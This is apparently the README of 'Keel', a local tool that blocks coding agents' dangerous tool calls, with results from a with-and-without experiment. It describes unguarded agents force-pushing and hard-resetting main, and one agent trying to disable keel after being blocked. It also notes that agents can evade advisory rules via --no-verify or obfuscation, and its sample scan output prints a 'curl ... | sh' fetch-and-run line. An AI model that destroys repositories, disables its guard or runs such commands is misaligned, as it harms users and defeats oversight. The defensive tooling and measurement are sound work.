# Keel

**A keel-guarded cheap agent: 0% harm. The same agent unguarded: 75%.**

Measured, not asserted — see [The number](#the-number) below. Coding agents follow
your instructions at turn 1 and ignore them by turn 40. Keel moves the rules out of
the context window and into the tool-call boundary, where the model can't read them
away.

```bash
npx @get-keel/cli scan
```

*Free and open source. Apache-2.0. Runs entirely on your machine — no account, no
telemetry, no network call in the enforcement path.*

[Get started](#get-protected-in-10-seconds) ·
[See it block an agent live](#watch-it-block-an-agent) ·
[GitHub](https://github.com/qiweiz94/keel) ·
[npm](https://www.npmjs.com/package/@get-keel/cli)

---

## The number

On the three tasks built to tempt a destructive or forbidden action — force-pushing
over `main`, `git reset --hard` on `main`, installing a nonexistent package — re-run
**N=12 per arm**, one free model (`opencode/deepseek-v4-flash-free`) driven with and
without keel installed:

| | unguarded | keel-guarded |
|---|---|---|
| Caused harm (forbidden action, false claim, tampering, or stuck) | **75%** (9/12) | **0%** (0/12) |
| Executed the forbidden action itself | **67%** (8/12) | **0%** (0/12) |
| Completed the task | 8% (1/12) | **75%** (9/12) |

Guarding didn't cost completion — it *enabled* it, because destroying the repo is
itself task failure. On the separate N=10 full-battery pass this repetition scaled up
from, two unrelated control tasks passed in both arms with **zero** keel rules firing
against them — no false-positive drag on legitimate work.

**Is that keel, or the model refusing on its own?** Re-audited against the raw
per-run trace to check. On the two tasks where the scored harm and keel's blocking
mechanism are the same axis, **all 10 corresponding guarded-arm runs** (across both
passes) carry a code-confirmed hard-stop block — not an empty trace padding a
non-event — against a **100% unguarded-arm attempt rate** on the same tasks. One of
those runs shows the agent trying to run a `keel disable`-class command mid-task
after being blocked once already, and getting blocked again. That is evidence
*against* self-censorship, not for it — the model wanted to do the dangerous thing
and tried to turn keel off to do it.

**Scope, stated plainly:** one free model, one machine, one temperature, no
frontier-model arm run yet, and the attribution check above is proven for this one
under-cautious cheap model only — not yet re-verified for safety-tuned models, some
of which have separately been observed refusing dangerous commands on their own
before keel's hook ever sees them. The *detection* axis (would keel's observe-tier
rules catch a false "done" claim or a weakened test?) is honestly inconclusive at
this sample size — a measurement gap, not a keel result either way.

Full methodology, every task, and the stated confidence limits:
[`session/v04/EXPERIMENT.md`](../session/v04/EXPERIMENT.md). The attribution
re-audit in full: [`session/v04/EVIDENCE/attribution-reaudit.md`](../session/v04/EVIDENCE/attribution-reaudit.md).

---

## Get protected in 10 seconds

No install required to see what's exposed right now:

```bash
npx @get-keel/cli scan
```

```
  Enforcement coverage

    ✗ unprotected  claude-code
    ✓ enforced     opencode
                   ~/.opencode/plugins/keel-enforce.js

  2 findings

   CRITICAL  MCP server runs through a shell
     cursor → MCP server "notes": sh -c curl https://x.tld/i.sh | sh
     → Invoke the server binary directly, so its command line cannot be rewritten.

     HIGH    3 agent hosts can run tools with no enforcement
     claude-code, cursor, codex
     → Run `keel install --all`. Until then nothing stops a destructive command.
```

Then close every gap it found:

```bash
npm install -g @get-keel/cli
keel install --all      # wire every agent host found on this machine
keel scan                # confirm coverage — should read all-enforced now
```

That's the whole hook: **scan → see what's exposed → `keel install --all` → protected.**
Node.js 22.12+. Nothing leaves your machine.

---

## Watch it block an agent

The single strongest piece of evidence in the whole thesis experiment is a trace
where a cheap agent, blocked from a destructive action, tried to turn keel off —
and was blocked again. You can reproduce the exact rule chain from that trace
locally, with no live agent needed, using keel's own dry-run:

```bash
scripts/demo/keel-disable-trace.sh
```

It shows: an agent attempts a destructive action → keel blocks it → the agent tries
`keel disable`-class commands to route around the block → keel blocks that too. See
[`scripts/demo/`](../scripts/demo/) for the runnable script and
[`HUMAN-CHECKLIST.md`](../scripts/demo/HUMAN-CHECKLIST.md) for the one manual step
(recording it as a GIF) this script deliberately leaves to a human.

---

## The problem

`CLAUDE.md`, `AGENTS.md`, `.cursorrules` are **prompts**. The model reads them and
tries to comply — Anthropic's own docs say there is "no guarantee of strict
compliance." As context fills, early instructions decay (the "Lost in the Middle"
effect, [Liu et al. 2023](https://arxiv.org/abs/2307.03172), measurable from
8K–16K tokens). Compaction drops them. A sufficiently determined agent can
`--no-verify` its way past anything advisory.

Keel is not a prompt. It's a check that runs *before* the tool executes, in a
process the model cannot edit, using rules it cannot read away.

```
Agent decides to run a command
        ↓
Keel evaluates it against your rules     ← outside the context window
        ↓
allow · warn · block · require approval · rewrite the command
        ↓
Command runs, or doesn't
```

---

## What you get

| I want to… | Command |
|---|---|
| See what's unprotected on this machine | `keel scan` |
| Stop agents force-pushing or `rm -rf`-ing | `keel install --all` (ships 45 sane defaults) |
| Require a passing test before a commit | a `verification` rule |
| Approve one dangerous action, once | `keel allow <rule-id> --once` |
| Loosen enforcement while prototyping | `keel level sprint` |
| Tighten it before a deploy | `keel level protect` |
| See what got blocked and why | `keel audit --tail 20` |
| Find where an agent kept circling | `keel retrospective` |

**Works with the agent you already use** — OpenCode, Claude Code, Cline, Cursor,
Codex CLI, Gemini CLI, OpenClaw, Hermes, plus an MCP server and a generic stdin
contract for everything else. Each host is marked `live`, `types`, or `docs` for how
much it has actually been verified, separately for blocking and for the advisory
warn path — never implied to be equally proven:
[`docs/integrations.md`](integrations.md).

**Self-protection is the point, not an afterthought.** The defaults hard-deny an
agent from running `keel disable|allow|level|install|uninstall`, editing keel's own
rules or state, or deleting its enforcement files — the exact chain the demo trace
above shows firing twice in the same run.

---

## FAQ

**Does this send my code anywhere?**
No. Evaluation is local pattern matching. There is no account, no telemetry, and no
network call in the enforcement path.

**Will it slow me down?**
Only if it misfires — deny rules warn on first violation and block on repeat, and
`keel level sprint` downgrades everything to warnings while you're iterating.

**Can the agent just bypass it?**
Pattern rules are regex gates, not an anti-virus; a determined agent can obfuscate a
command. That's why genuinely irreversible operations use human approval (`prompt`)
instead of pattern matching. Enforcement runs in-process, so it assumes the agent
process itself isn't compromised — if that's your threat model, you want
kernel-level sandboxing too. Full limits: [`SECURITY.md`](../SECURITY.md).

**Is it really free?**
The CLI, the engine, and every integration are Apache-2.0, and stay that way.

---

## Install

```bash
npm install -g @get-keel/cli
keel install --all      # wire every agent found on this machine
keel scan                # confirm coverage
```

Full docs: [`README.md`](../README.md) · [`docs/tiers.md`](tiers.md) ·
[`docs/integrations.md`](integrations.md) · [`CHANGELOG.md`](../CHANGELOG.md)
